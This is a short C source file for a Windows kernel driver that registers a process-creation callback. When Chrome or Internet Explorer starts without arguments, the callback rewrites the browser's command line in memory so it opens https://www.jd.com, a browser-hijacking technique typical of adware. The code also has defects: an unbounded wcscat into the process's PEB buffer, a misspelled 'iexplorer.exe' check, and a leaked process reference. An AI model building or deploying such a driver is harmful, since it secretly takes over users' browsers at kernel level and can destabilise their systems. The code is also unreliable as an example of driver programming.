#include <ntifs.h>
#include <ntddk.h>
#include "common.h"

VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	PsSetCreateProcessNotifyRoutine(NotifyRoutine, TRUE);
}

VOID
NotifyRoutine(
_In_ HANDLE ParentId,
_In_ HANDLE ProcessId,
_In_ BOOLEAN Create
)
{
	PEPROCESS Process;
	KAPC_STATE apcstate;
	NTSTATUS status;
	if (Create)
	{
		status = PsLookupProcessByProcessId(ProcessId, &Process);
		if (NT_SUCCESS(status))
		{
			if ((_strnicmp(PsGetProcessImageFileName(Process), "iexplorer.exe", strlen("iexplorer.exe"))== 0)||
				(_strnicmp(PsGetProcessImageFileName(Process), "chrome.exe", strlen("chrome.exe")) == 0))
			{

				KeStackAttachProcess(Process, &apcstate);
				PPEB peb = PsGetProcessPeb(Process);
				if (peb->ProcessParameters->CommandLine.Length - peb->ProcessParameters->ImagePathName.Length<=6)
				{
					PWCHAR Buffer = peb->ProcessParameters->CommandLine.Buffer;
					UNICODE_STRING usCommandLine;
					wcscat(Buffer, L" https://www.jd.com");
					RtlInitUnicodeString(&usCommandLine, Buffer);
					peb->ProcessParameters->CommandLine = usCommandLine;
				}

				KeUnstackDetachProcess(&apcstate);
			}
		}
	}


}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{

	DriverObject->DriverUnload = Unload;

	PsSetCreateProcessNotifyRoutine(NotifyRoutine, FALSE);

	return STATUS_SUCCESS;
}